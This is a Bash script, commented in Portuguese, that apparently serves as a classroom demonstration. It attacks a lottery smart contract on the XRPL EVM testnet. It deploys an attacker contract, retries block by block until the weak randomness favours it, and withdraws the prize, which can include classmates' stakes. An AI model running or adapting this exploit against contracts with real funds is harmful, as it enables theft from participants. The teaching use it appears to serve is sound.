#!/usr/bin/env bash
#
# Ataque AO VIVO contra o Sorteio na XRPL EVM Testnet.
#
#   ./script/ataque-testnet.sh
#
# Variáveis de ambiente (todas opcionais):
#   SORTEIO=0x...       endereço do contrato (padrão: o já implantado)
#   PULAR_HONESTOS=1    NÃO cria jogadores honestos — use quando a turma já
#                       entrou pelo site (o atacante rouba o prêmio deles)
#   TENTATIVAS=60       quantos blocos tentar antes de desistir
#
# Pré-requisitos: Foundry instalado, carteira `deployer` importada com XRP de
# teste, e `jq` disponível.
#
set -euo pipefail
export PATH="$HOME/.foundry/bin:$PATH"
cd "$(dirname "$0")/.."

RPC=xrpl_testnet
ACCOUNT=deployer
SENHA=""   # keystore criado com senha vazia; ajuste se usou outra
SORTEIO=${SORTEIO:-0xe81959Db75f23D05Cc5e6CbEfec3cE616632B781}
TENTATIVAS=${TENTATIVAS:-60}

enviar() { cast send "$@" --rpc-url "$RPC" --account "$ACCOUNT" --password "$SENHA"; }
ler()    { cast call "$@" --rpc-url "$RPC"; }

# Carteira que assina tudo = dono do atacante = quem RECEBE o prêmio no final.
DONO=$(cast wallet address --account "$ACCOUNT" --password "$SENHA")

echo "========================================================"
echo " Sorteio:  $SORTEIO"
echo " Jogadores agora: $(ler "$SORTEIO" 'totalJogadores()(uint256)')"
echo "========================================================"

# Saldo da sua carteira ANTES de toda a operação (para comparar no final).
SALDO_ANTES=$(cast balance "$DONO" --rpc-url "$RPC" --ether)

# ---------------------------------------------------------------------------
# 1. Jogadores honestos (as "vítimas"). Pulado com PULAR_HONESTOS=1.
# ---------------------------------------------------------------------------
if [ "${PULAR_HONESTOS:-0}" != "1" ]; then
  echo
  echo ">> 2 jogadores honestos entram (0.1 XRP cada)"
  enviar "$SORTEIO" "entrar()" --value 0.1ether >/dev/null
  enviar "$SORTEIO" "entrar()" --value 0.1ether >/dev/null
  echo "   jogadores agora: $(ler "$SORTEIO" 'totalJogadores()(uint256)')"
fi

# ---------------------------------------------------------------------------
# 2. Deploy do contrato atacante.
# ---------------------------------------------------------------------------
echo
echo ">> deploy do atacante"
ATACANTE=$(forge create script/AtacanteLive.sol:AtacanteLive \
  --rpc-url "$RPC" --account "$ACCOUNT" --password "$SENHA" \
  --broadcast --json \
  --constructor-args "$SORTEIO" | jq -r '.deployedTo')
echo "   Atacante: $ATACANTE"

# ---------------------------------------------------------------------------
# 3. Loop de ataque: reverte quando o bloco não favorece (só gasta gas) e
#    tenta de novo no bloco seguinte, até cair no índice vencedor.
# ---------------------------------------------------------------------------
echo
echo ">> atacando até ganhar (revert = não é a nossa vez)"
GANHOU=0
for i in $(seq 1 "$TENTATIVAS"); do
  RESP=$(cast send "$ATACANTE" "atacar()" --value 0.1ether --gas-limit 600000 \
          --rpc-url "$RPC" --account "$ACCOUNT" --password "$SENHA" --json 2>/dev/null || true)
  ST=$(printf '%s' "$RESP" | jq -r '.status // "0x0"' 2>/dev/null || echo "0x0")
  if [ "$ST" = "0x1" ]; then
    echo "   tentativa $i: GANHOU 🎉"
    GANHOU=1
    break
  fi
  echo "   tentativa $i: não foi a vez, próximo bloco..."
  sleep 4
done

if [ "$GANHOU" != "1" ]; then
  echo "!! não ganhou em $TENTATIVAS tentativas (azar ou poucos jogadores)."
  exit 1
fi

# ---------------------------------------------------------------------------
# 4. Conferir e sacar o prêmio.
# ---------------------------------------------------------------------------
echo
echo ">> último vencedor: $(ler "$SORTEIO" 'ultimoVencedor()(address)')"
echo "   (deve ser o CONTRATO atacante: $ATACANTE)"
echo
PREMIO=$(cast balance "$ATACANTE" --rpc-url "$RPC" --ether)
echo ">> prêmio capturado, parado no contrato atacante: $PREMIO XRP"
echo
echo ">> sacando o prêmio para a SUA carteira ($DONO)"
enviar "$ATACANTE" "sacar()" >/dev/null
SALDO_DEPOIS=$(cast balance "$DONO" --rpc-url "$RPC" --ether)
echo "   contrato atacante agora: $(cast balance "$ATACANTE" --rpc-url "$RPC" --ether) XRP (zerado — foi tudo pra sua carteira)"
echo "   sua carteira ANTES de tudo: $SALDO_ANTES XRP"
echo "   sua carteira AGORA:         $SALDO_DEPOIS XRP"
echo
echo "FIM. Veja no explorer:"
echo "   Sorteio:  https://explorer.testnet.xrplevm.org/address/$SORTEIO"
echo "   Atacante: https://explorer.testnet.xrplevm.org/address/$ATACANTE"
